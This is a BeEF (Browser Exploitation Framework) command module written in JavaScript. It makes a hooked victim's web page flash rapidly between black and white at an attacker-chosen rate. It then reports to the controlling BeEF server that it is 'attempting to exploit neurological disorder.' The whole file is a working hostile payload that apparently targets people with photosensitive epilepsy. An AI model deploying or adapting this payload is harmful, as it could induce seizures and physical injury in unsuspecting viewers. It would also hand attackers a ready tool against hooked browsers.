//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	var flashes_per_second = "<%= @flashes_per_second %>";
	var toggle = false;
	var task = setInterval(function() {
		if(toggle = !toggle) {
			document.body.style.backgroundColor = '#000';
		} else {
			document.body.style.backgroundColor = '#fff';
		}
	}, Math.floor(1000/flashes_per_second));

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=attempting to exploit neurological disorder in OSI layer 8');

});

